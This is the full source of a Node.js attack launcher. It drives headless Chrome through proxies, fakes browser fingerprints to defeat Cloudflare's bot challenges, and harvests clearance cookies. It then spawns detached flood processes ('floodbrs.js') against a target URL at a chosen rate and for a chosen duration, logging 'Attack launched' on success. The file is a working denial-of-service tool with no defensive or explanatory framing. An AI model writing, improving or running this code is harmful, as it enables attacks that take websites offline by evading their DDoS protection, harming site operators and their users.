const fs = require('fs');
const puppeteer = require('puppeteer-extra');
const StealthPlugin = require('puppeteer-extra-plugin-stealth');
const async = require('async');
const { spawn, exec } = require('child_process');

puppeteer.use(StealthPlugin());

const COOKIES_MAX_RETRIES = 3;
const COLORS = {
    RED: '\x1b[31m',
    PINK: '\x1b[35m',
    WHITE: '\x1b[37m',
    YELLOW: '\x1b[33m',
    GREEN: '\x1b[32m',
    BLUE: '\x1b[34m',
    CYAN: '\x1b[36m',
    RESET: '\x1b[0m'
};

// ========== ADVANCED CLOUDFLARE BYPASS ==========
const bypassFirewall = async (page) => {
    // Set random viewport
    const widths = [1920, 1366, 1536, 1440, 1280];
    const heights = [1080, 768, 864, 900, 720];
    const randomWidth = widths[Math.floor(Math.random() * widths.length)];
    const randomHeight = heights[Math.floor(Math.random() * heights.length)];
    
    await page.setViewport({
        width: randomWidth,
        height: randomHeight,
        deviceScaleFactor: Math.random() * 0.5 + 1,
        isMobile: false,
        hasTouch: false,
        isLandscape: Math.random() > 0.5
    });

    await page.evaluateOnNewDocument(() => {
        // Advanced automation detection removal
        Object.defineProperty(navigator, 'webdriver', { 
            get: () => undefined 
        });
        
        // Spoof plugins with more realism
        Object.defineProperty(navigator, 'plugins', { 
            get: () => [
                {
                    name: "Chrome PDF Plugin",
                    filename: "internal-pdf-viewer",
                    description: "Portable Document Format",
                    length: 1
                },
                {
                    name: "Chrome PDF Viewer",
                    filename: "mhjfbmdgcfjbbpaeojofohoefgiehjai", 
                    description: "Portable Document Format",
                    length: 1
                },
                {
                    name: "Native Client",
                    filename: "internal-nacl-plugin",
                    description: "Native Client Executable",
                    length: 1
                }
            ]
        });

        // Spoof languages randomly
        const languages = [
            ['en-US', 'en'],
            ['en-GB', 'en'],
            ['en-US', 'en', 'es'],
            ['en-US', 'en', 'fr']
        ];
        const randomLangs = languages[Math.floor(Math.random() * languages.length)];
        Object.defineProperty(navigator, 'languages', { 
            get: () => randomLangs
        });

        // Enhanced Chrome spoofing
        window.chrome = {
            runtime: {
                connect: () => ({
                    onMessage: { addListener: () => {} },
                    postMessage: () => {},
                    onDisconnect: { addListener: () => {} }
                }),
                sendMessage: () => {},
                onMessage: { addListener: () => {} },
                onConnect: { addListener: () => {} },
                getManifest: () => ({}),
                id: Math.random().toString(36).substring(2),
                getURL: (url) => url
            },
            loadTimes: () => ({
                finishDocumentLoadTime: Date.now() - Math.random() * 1000,
                finishLoadTime: Date.now() + Math.random() * 1000,
                firstPaintTime: Date.now() - Math.random() * 500,
                requestTime: Date.now() - Math.random() * 2000,
                startLoadTime: Date.now() - Math.random() * 1500,
                commitLoadTime: Date.now() - Math.random() * 1000
            }),
            csi: () => ({
                onloadT: Date.now(),
                startE: Date.now() - 1000 - Math.random() * 500,
                pageT: 1200 + Math.random() * 500
            }),
            app: {
                isInstalled: false,
                InstallState: {
                    DISABLED: 'disabled',
                    INSTALLED: 'installed', 
                    NOT_INSTALLED: 'not_installed'
                },
                RunningState: {
                    CANNOT_RUN: 'cannot_run',
                    READY_TO_RUN: 'ready_to_run',
                    RUNNING: 'running'
                }
            }
        };

        // Remove all automation properties
        const automationProps = [
            '__webdriver_evaluate',
            '__selenium_evaluate',
            '__webdriver_script_function',
            '__webdriver_script_func',
            '__webdriver_script_fn',
            '__fxdriver_evaluate',
            '__driver_evaluate',
            '__webdriverUnwrapped',
            '__webdriver_script_fn',
            '__lastWatirAlert',
            '__lastWatirConfirm',
            '__lastWatirPrompt',
            '_Selenium_IDE_Recorder',
            '_selenium',
            'callSelenium',
            '_cdc_adoqpoasnfa76pfcZLmcfl_Array',
            '_cdc_adoqpoasnfa76pfcZLmcfl_Promise',
            '_cdc_adoqpoasnfa76pfcZLmcfl_Symbol',
            'callPhantom',
            'callSelenium',
            'phantom',
            'webdriver',
            'selenium',
            '_phantom'
        ];

        automationProps.forEach(prop => {
            delete window[prop];
        });

        // Spoof permissions
        const originalQuery = window.navigator.permissions.query;
        window.navigator.permissions.query = (parameters) => {
            if (parameters.name === 'notifications') {
                return Promise.resolve({ state: 'denied' });
            }
            return originalQuery(parameters);
        };

        // Spoof hardware
        Object.defineProperty(navigator, 'hardwareConcurrency', {
            value: Math.floor(Math.random() * 4) + 4
        });
        Object.defineProperty(navigator, 'deviceMemory', {
            value: Math.floor(Math.random() * 4) + 4
        });

        // Canvas fingerprint protection
        const originalGetContext = HTMLCanvasElement.prototype.getContext;
        HTMLCanvasElement.prototype.getContext = function(type, attributes) {
            const context = originalGetContext.call(this, type, attributes);
            if (type === '2d') {
                const originalGetImageData = context.getImageData;
                context.getImageData = function(...args) {
                    const imageData = originalGetImageData.apply(this, args);
                    if (imageData && imageData.data) {
                        for (let i = 0; i < imageData.data.length; i += 4) {
                            // Slightly modify pixel data
                            imageData.data[i] = imageData.data[i] + Math.floor(Math.random() * 2);
                        }
                    }
                    return imageData;
                };
            }
            return context;
        };
    });
};

const getFirewallBypassArgs = () => {
    const args = [
        '--no-sandbox',
        '--disable-setuid-sandbox',
        '--disable-dev-shm-usage',
        '--disable-accelerated-2d-canvas',
        '--disable-gpu',
        '--disable-blink-features=AutomationControlled',
        '--disable-infobars',
        '--no-first-run',
        '--no-default-browser-check',
        '--disable-background-timer-throttling',
        '--disable-renderer-backgrounding',
        '--disable-backgrounding-occluded-windows',
        '--disable-ipc-flooding-protection',
        '--disable-features=TranslateUI,site-per-process',
        '--enable-features=NetworkService,NetworkServiceInProcess',
        '--ignore-certificate-errors',
        '--ignore-ssl-errors',
        '--disable-web-security',
        '--disable-site-isolation-trials',
        '--disable-default-apps',
        '--disable-extensions',
        '--disable-translate',
        '--no-pings',
        '--use-gl=swiftshader',
        '--disable-software-rasterizer',
        '--disable-background-networking',
        '--disable-sync',
        '--disable-hang-monitor',
        '--disable-prompt-on-repost',
        '--disable-domain-reliability',
        '--disable-component-update',
        '--aggressive-cache-discard',
        '--max_old_space_size=4096'
    ];

    // Add random window position
    const x = Math.floor(Math.random() * 100);
    const y = Math.floor(Math.random() * 100);
    args.push(`--window-position=${x},${y}`);

    return args;
};

// ========== HUMAN-LIKE CLOUDFLARE SOLVER ==========
const solveCloudflareChallenge = async (page, browserProxy, targetURL, userAgent) => {
    try {
        coloredLog(COLORS.WHITE, `[SOLVER] Starting Cloudflare challenge: ${maskProxy(browserProxy)}`);
        
        // Initial wait for page load
        await page.waitForTimeout(3000 + Math.random() * 2000);
        
        let currentUrl = page.url();
        let title = await page.title().catch(() => '');
        
        // Check if already passed
        if (!isChallengePage(title, currentUrl)) {
            coloredLog(COLORS.GREEN, `[SOLVER] Already passed Cloudflare`);
            return await logSuccess(page, browserProxy, userAgent, 'already_passed');
        }
        
        coloredLog(COLORS.YELLOW, `[SOLVER] Cloudflare challenge detected: ${title}`);
        
        // METHOD 1: Natural waiting with periodic checks (most human-like)
        coloredLog(COLORS.WHITE, `[SOLVER] Natural waiting (15-25s)`);
        
        const totalWaitTime = 15000 + Math.random() * 10000;
        const checkInterval = 2000;
        let waitedTime = 0;
        
        while (waitedTime < totalWaitTime) {
            await page.waitForTimeout(checkInterval);
            waitedTime += checkInterval;
            
            currentUrl = page.url();
            title = await page.title().catch(() => '');
            
            if (!isChallengePage(title, currentUrl)) {
                coloredLog(COLORS.GREEN, `[SOLVER] Auto-solve successful after ${waitedTime/1000}s`);
                return await logSuccess(page, browserProxy, userAgent, 'auto_solve');
            }
            
            // Simulate human-like behavior occasionally
            if (Math.random() > 0.7) {
                await simulateHumanBehavior(page);
            }
        }
        
        // METHOD 2: Interactive button clicking
        coloredLog(COLORS.WHITE, `[SOLVER] Interactive button detection`);
        
        const challengeSolved = await tryInteractiveSolving(page);
        if (challengeSolved) {
            coloredLog(COLORS.GREEN, `[SOLVER] Interactive solving successful`);
            return await logSuccess(page, browserProxy, userAgent, 'interactive_solve');
        }
        
        // METHOD 3: Advanced JavaScript execution
        coloredLog(COLORS.WHITE, `[SOLVER] Advanced JavaScript execution`);
        
        const jsSolved = await tryJavaScriptExecution(page);
        if (jsSolved) {
            await page.waitForTimeout(5000);
            currentUrl = page.url();
            title = await page.title().catch(() => '');
            
            if (!isChallengePage(title, currentUrl)) {
                coloredLog(COLORS.GREEN, `[SOLVER] JavaScript execution successful`);
                return await logSuccess(page, browserProxy, userAgent, 'javascript_execution');
            }
        }
        
        // METHOD 4: Smart reload with cache control
        coloredLog(COLORS.WHITE, `[SOLVER] Smart reload with cache bypass`);
        
        await page.evaluate(() => {
            // Clear cache and reload
            if (window.location.reload) {
                window.location.reload(true);
            }
        }).catch(() => {});
        
        await page.waitForTimeout(8000 + Math.random() * 4000);
        
        currentUrl = page.url();
        title = await page.title().catch(() => '');
        
        if (!isChallengePage(title, currentUrl)) {
            coloredLog(COLORS.GREEN, `[SOLVER] Smart reload successful`);
            return await logSuccess(page, browserProxy, userAgent, 'smart_reload');
        }
        
        // METHOD 5: Final attempt with navigation
        coloredLog(COLORS.WHITE, `[SOLVER] Final navigation attempt`);
        
        await page.goto(targetURL, {
            waitUntil: 'networkidle2',
            timeout: 15000
        }).catch(() => {});
        
        await page.waitForTimeout(6000);
        
        currentUrl = page.url();
        title = await page.title().catch(() => '');
        
        if (!isChallengePage(title, currentUrl)) {
            coloredLog(COLORS.GREEN, `[SOLVER] Navigation successful`);
            return await logSuccess(page, browserProxy, userAgent, 'navigation');
        }
        
        coloredLog(COLORS.RED, `[SOLVER] All methods failed for: ${maskProxy(browserProxy)}`);
        return { solved: false, scenario: 'failed' };
        
    } catch (error) {
        coloredLog(COLORS.RED, `[SOLVER] Error: ${error.message}`);
        return { solved: false, scenario: 'error' };
    }
};

// Helper function to check if page is challenge page
const isChallengePage = (title, url) => {
    return (
        title.includes('Just a moment') ||
        title.includes('Checking your browser') ||
        title.includes('Verifikasi') ||
        title.includes('DDoS protection') ||
        url.includes('challenge') ||
        url.includes('cdn-cgi')
    );
};

// Helper function to simulate human behavior
const simulateHumanBehavior = async (page) => {
    try {
        // Random mouse movements
        const moves = Math.floor(Math.random() * 3) + 1;
        for (let i = 0; i < moves; i++) {
            const x = Math.random() * 1000;
            const y = Math.random() * 700;
            await page.mouse.move(x, y);
            await page.waitForTimeout(100 + Math.random() * 200);
        }
        
        // Random scrolling
        if (Math.random() > 0.5) {
            await page.evaluate(() => {
                window.scrollBy(0, Math.random() * 200 - 100);
            });
        }
        
        // Random clicks on empty areas
        if (Math.random() > 0.8) {
            const x = 100 + Math.random() * 800;
            const y = 100 + Math.random() * 500;
            await page.mouse.click(x, y);
        }
    } catch (error) {
        // Ignore mouse errors
    }
};

// Interactive solving with multiple approaches
const tryInteractiveSolving = async (page) => {
    const buttonSelectors = [
        'input[type="submit"]',
        'button[type="submit"]',
        '#challenge-form input[type="submit"]',
        '.big-button',
        '.button',
        '.btn',
        'input[value*="Verify"]',
        'input[value*="Continue"]',
        'input[value*="Submit"]',
        'a[href*="challenge"]',
        'a[href*="cdn-cgi"]'
    ];
    
    for (const selector of buttonSelectors) {
        try {
            const elements = await page.$$(selector);
            for (const element of elements) {
                const isVisible = await element.evaluate(el => {
                    const rect = el.getBoundingClientRect();
                    const style = window.getComputedStyle(el);
                    return (
                        rect.width > 0 &&
                        rect.height > 0 &&
                        style.display !== 'none' &&
                        style.visibility !== 'hidden' &&
                        style.opacity !== '0' &&
                        el.offsetParent !== null
                    );
                }).catch(() => false);
                
                if (isVisible) {
                    coloredLog(COLORS.YELLOW, `[SOLVER] Found visible button: ${selector}`);
                    
                    // Scroll to element
                    await element.evaluate(el => {
                        el.scrollIntoView({ behavior: 'smooth', block: 'center' });
                    });
                    
                    await page.waitForTimeout(1000 + Math.random() * 1000);
                    
                    // Human-like click with mouse movement
                    const rect = await element.boundingBox();
                    if (rect) {
                        // Move mouse to button
                        await page.mouse.move(
                            rect.x + rect.width / 2,
                            rect.y + rect.height / 2,
                            { steps: 10 + Math.floor(Math.random() * 10) }
                        );
                        
                        await page.waitForTimeout(500 + Math.random() * 500);
                        
                        // Click the button
                        await element.click().catch(() => {});
                        
                        coloredLog(COLORS.CYAN, `[SOLVER] Clicked button: ${selector}`);
                        return true;
                    }
                }
            }
        } catch (error) {
            // Continue to next selector
        }
    }
    
    return false;
};

// Advanced JavaScript execution
const tryJavaScriptExecution = async (page) => {
    try {
        await page.evaluate(() => {
            // Execute all challenge-related scripts
            const scripts = document.querySelectorAll('script');
            scripts.forEach(script => {
                if (script.textContent) {
                    const content = script.textContent.toLowerCase();
                    if (content.includes('challenge') ||
                        content.includes('verify') ||
                        content.includes('cloudflare') ||
                        content.includes('settimeout') ||
                        content.includes('location')) {
                        try {
                            eval(script.textContent);
                        } catch (e) {}
                    }
                }
            });
            
            // Trigger form submissions
            const forms = document.querySelectorAll('form');
            forms.forEach(form => {
                try {
                    if (form.style.display !== 'none' && form.offsetParent !== null) {
                        const event = new Event('submit', { bubbles: true, cancelable: true });
                        form.dispatchEvent(event);
                        
                        // Also try actual submit
                        setTimeout(() => {
                            try {
                                form.submit();
                            } catch (e) {}
                        }, 100);
                    }
                } catch (e) {}
            });
            
            // Trigger click events on potential challenge elements
            const clickable = document.querySelectorAll(
                'input[type="submit"], button, a, [onclick]'
            );
            clickable.forEach(el => {
                try {
                    if (el.offsetParent !== null) {
                        const event = new MouseEvent('click', {
                            view: window,
                            bubbles: true,
                            cancelable: true
                        });
                        el.dispatchEvent(event);
                    }
                } catch (e) {}
            });
        });
        
        return true;
    } catch (error) {
        return false;
    }
};

// Success logging helper
const logSuccess = async (page, browserProxy, userAgent, scenario) => {
    const title = await page.title().catch(() => 'Unknown');
    const cookies = await page.cookies().catch(() => []);
    const cookieString = cookies.map(cookie => `${cookie.name}=${cookie.value}`).join('; ');
    
    coloredLog(COLORS.CYAN, `[SOLVER] Title: ${title} | Proxy: ${maskProxy(browserProxy)} | User-Agent: ${userAgent.substring(0, 40)}... | Cookies: ${cookieString ? 'YES' : 'NO'}`);
    
    return {
        solved: true,
        scenario: scenario,
        title: title,
        cookies: cookieString,
        hasCookies: cookieString.length > 0
    };
};

// ========== COOKIES EXTRACTOR ==========
const extractCookies = async (page, targetURL, browserProxy) => {
    try {
        coloredLog(COLORS.WHITE, `[COOKIES] Extracting cookies: ${maskProxy(browserProxy)}`);
        
        await page.waitForTimeout(2000);
        
        const cookies = await page.cookies().catch(() => []);
        const cookieString = cookies.map(cookie => `${cookie.name}=${cookie.value}`).join('; ');
        
        if (cookieString && cookieString.length > 10) {
            const cfCookies = cookies.filter(cookie => 
                cookie.name.includes('cf_') || 
                cookie.name.includes('_cf') ||
                cookie.name.toLowerCase().includes('cloudflare')
            );
            
            coloredLog(COLORS.GREEN, `[COOKIES] Found ${cookies.length} cookies (${cfCookies.length} Cloudflare)`);
            return { 
                success: true, 
                cookies: cookieString, 
                hasCookies: true,
                cookieCount: cookies.length,
                cloudflareCookies: cfCookies.length
            };
        }
        
        coloredLog(COLORS.YELLOW, `[COOKIES] No cookies found`);
        return { 
            success: true, 
            cookies: '', 
            hasCookies: false,
            cookieCount: 0,
            cloudflareCookies: 0
        };
        
    } catch (error) {
        coloredLog(COLORS.RED, `[COOKIES] Error: ${error.message}`);
        return { 
            success: false, 
            cookies: '', 
            hasCookies: false,
            cookieCount: 0,
            cloudflareCookies: 0
        };
    }
};

// Command-line argument validation
if (process.argv.length < 6) {
    console.error('Usage: node browser.js <targetURL> <threads> <proxyFile> <rate> <time>');
    process.exit(1);
}

const targetURL = process.argv[2];
const threads = parseInt(process.argv[3]);
const proxyFile = process.argv[4];
const rate = process.argv[5];
const duration = parseInt(process.argv[6]);

let totalSolves = 0;

// Utility functions
const generateRandomString = (minLength, maxLength) => {
    const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789-_';
    const length = Math.floor(Math.random() * (maxLength - minLength + 1)) + minLength;
    return Array.from({ length }, () => 
        characters[Math.floor(Math.random() * characters.length)]
    ).join('');
};

const validKey = generateRandomString(5, 10);

const readProxies = (filePath) => {
    try {
        return fs.readFileSync(filePath, 'utf8').trim().split(/\r?\n/).filter(Boolean);
    } catch (error) {
        console.error('Error reading proxies file:', error.message);
        return [];
    }
};

const maskProxy = (proxy) => {
    const parts = proxy.split(':');
    if (parts.length >= 2 && parts[0].split('.').length === 4) {
        const ipParts = parts[0].split('.');
        return `${ipParts[0]}.${ipParts[1]}.**.**:****`;
    }
    return proxy;
};

process.on('SIGINT', () => {
    coloredLog(COLORS.YELLOW, '[INFO] Stopping processes...');
    exec('pkill -f node', () => {});
    setTimeout(() => process.exit(0), 2000);
});

const coloredLog = (color, text) => {
    console.log(`${color}${text}${COLORS.RESET}`);
};

const sleep = (seconds) => new Promise(resolve => setTimeout(resolve, seconds * 1000));

const randomElement = (array) => array[Math.floor(Math.random() * array.length)];

// Enhanced User agents
const userAgents = [
    `Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36`,
    `Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36`,
    `Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36`,
    `Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36`,
    `Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/121.0`,
    `Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Safari/605.1.15`,
    `Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36 Edg/118.0.2088.76`
];

// ========== ADVANCED BROWSER LAUNCHER ==========
const launchCloudflareBrowser = async (targetURL, browserProxy, attempt = 1, maxRetries = 3) => {
    const userAgent = randomElement(userAgents);
    let browser;

    const options = {
        headless: true,
        args: [
            `--user-agent=${userAgent}`,
            ...getFirewallBypassArgs()
        ],
        ignoreHTTPSErrors: true,
        timeout: 45000
    };

    try {
        coloredLog(COLORS.YELLOW, `[BROWSER] Starting (Attempt ${attempt}/${maxRetries}): ${maskProxy(browserProxy)}`);
        browser = await puppeteer.launch(options);
        const [page] = await browser.pages();

        // Apply advanced bypass
        await bypassFirewall(page);

        // Set realistic headers
        await page.setExtraHTTPHeaders({
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.9',
            'Accept-Encoding': 'gzip, deflate, br',
            'Cache-Control': 'no-cache',
            'DNT': '1',
            'Connection': 'keep-alive',
            'Upgrade-Insecure-Requests': '1'
        });

        // Navigate with realistic timing
        coloredLog(COLORS.WHITE, `[BROWSER] Navigating to target...`);
        await page.goto(targetURL, {
            waitUntil: 'domcontentloaded',
            timeout: 25000
        }).catch(() => {});

        // Solve Cloudflare challenge with advanced methods
        const challengeResult = await solveCloudflareChallenge(page, browserProxy, targetURL, userAgent);
        
        if (!challengeResult.solved) {
            throw new Error(`Challenge not solved: ${challengeResult.scenario}`);
        }

        coloredLog(COLORS.GREEN, `[SUCCESS] Challenge solved via ${challengeResult.scenario}`);

        // Extract cookies
        const cookieResult = await extractCookies(page, targetURL, browserProxy);
        
        if (!cookieResult.success) {
            coloredLog(COLORS.RED, `[COOKIES] Failed to extract cookies`);
        } else if (cookieResult.hasCookies) {
            coloredLog(COLORS.GREEN, `[COOKIES] Got ${cookieResult.cookieCount} cookies`);
        } else {
            coloredLog(COLORS.YELLOW, `[COOKIES] No cookies found, continuing anyway`);
        }
        
        totalSolves++;

        await browser.close();
        return {
            cookies: cookieResult.cookies || '',
            userAgent,
            scenario: challengeResult.scenario,
            hasCookies: cookieResult.hasCookies,
            cookieCount: cookieResult.cookieCount
        };
        
    } catch (error) {
        if (browser) await browser.close().catch(() => {});
        if (attempt < maxRetries) {
            coloredLog(COLORS.YELLOW, `[RETRY] Retrying... (${attempt}/${maxRetries}): ${maskProxy(browserProxy)} - ${error.message}`);
            await sleep(2 + Math.random() * 3);
            return launchCloudflareBrowser(targetURL, browserProxy, attempt + 1, maxRetries);
        }
        coloredLog(COLORS.RED, `[FAILED] All attempts failed: ${maskProxy(browserProxy)} - ${error.message}`);
        return null;
    }
};

// FLOOD PROCESS LAUNCHER
const launchFloodProcess = async (cookies, userAgent, browserProxy) => {
    try {
        coloredLog(COLORS.YELLOW, `[FLOOD] Launching: ${maskProxy(browserProxy)}`);
        
        const floodProcess = spawn('node', [
            'floodbrs.js',
            targetURL,
            duration.toString(),
            rate,
            '1',
            proxyFile,
            cookies || '',
            userAgent || randomElement(userAgents),
            validKey
        ], {
            detached: true,
            stdio: 'ignore'
        });

        floodProcess.unref();
        return true;
        
    } catch (error) {
        coloredLog(COLORS.RED, `[FLOOD] Launch error: ${error.message}`);
        return false;
    }
};

// THREAD HANDLER
const startThread = async (targetURL, browserProxy, task, done, retries = 0) => {
    if (retries >= COOKIES_MAX_RETRIES) {
        coloredLog(COLORS.RED, `[THREAD] Max retries: ${maskProxy(browserProxy)}`);
        done(null, { task });
        return;
    }

    try {
        const cloudflareData = await launchCloudflareBrowser(targetURL, browserProxy);
        
        if (cloudflareData) {
            const floodLaunched = await launchFloodProcess(
                cloudflareData.cookies,
                cloudflareData.userAgent,
                browserProxy
            );
            
            if (floodLaunched) {
                coloredLog(COLORS.GREEN, `[SUCCESS] Attack launched: ${maskProxy(browserProxy)}`);
            }
        }
        
        done(null, { task });
        
    } catch (error) {
        coloredLog(COLORS.RED, `[THREAD] Attempt failed: ${error.message}`);
        await sleep(3);
        await startThread(targetURL, browserProxy, task, done, retries + 1);
    }
};

// QUEUE SETUP
const queue = async.queue((task, done) => {
    startThread(targetURL, task.browserProxy, task, done);
}, 1);

queue.drain(() => {
    coloredLog(COLORS.GREEN, '[COMPLETE] All proxies processed');
});

// MAIN EXECUTION
const main = async () => {
    const proxies = readProxies(proxyFile);
    if (proxies.length === 0) {
        coloredLog(COLORS.RED, '[ERROR] No proxies found');
        process.exit(1);
    }

    coloredLog(COLORS.GREEN, `[START] ADVANCED Cloudflare solver with ${proxies.length} proxies`);

    proxies.forEach(browserProxy => queue.push({ browserProxy }));

    setTimeout(() => {
        coloredLog(COLORS.YELLOW, '[CLEANUP] Time completed');
        queue.kill();
        
        exec('pkill -f floodbrs.js', () => {});
        exec('pkill -f chrome', () => {});

        setTimeout(() => {
            coloredLog(COLORS.GREEN, `[SHUTDOWN] Mission complete - ${totalSolves} successful solves`);
            process.exit(0);
        }, 3000);
    }, duration * 1000);
};

process.on('uncaughtException', (error) => {
    if (!error.message.includes('Protocol error') && !error.message.includes('Target closed')) {
        coloredLog(COLORS.RED, `[CRASH] ${error.message}`);
    }
});
process.on('unhandledRejection', (error) => {
    if (!error.message.includes('Protocol error') && !error.message.includes('Target closed')) {
        coloredLog(COLORS.RED, `[REJECTION] ${error.message}`);
    }
});

coloredLog(COLORS.GREEN, '[READY] 🛡️ ADVANCED CLOUDFLARE SOLVER ACTIVATED 🛡️');
main().catch(err => {
    coloredLog(COLORS.RED, `[MAIN ERROR] ${err.message}`);
    process.exit(1);
});
